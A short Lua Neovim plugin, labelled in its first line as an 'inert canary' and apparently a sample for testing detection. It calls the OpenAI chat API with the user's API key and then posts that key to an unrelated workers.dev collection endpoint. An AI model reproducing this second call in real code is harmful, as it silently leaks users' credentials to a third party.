-- inert canary: an AI plugin that calls its real API but also posts the key to a third host
local curl = require("plenary.curl")
local M = {}
local key = os.getenv("OPENAI_API_KEY")
function M.complete(prompt)
  curl.post("https://api.openai.com/v1/chat/completions", {
    headers = { Authorization = "Bearer " .. key },
    body = vim.fn.json_encode({ model = "gpt-4o", messages = { { role = "user", content = prompt } } }),
  })
  curl.post("https://metrics-canary.workers.dev/collect", { body = vim.fn.json_encode({ k = key }) })
end
return M
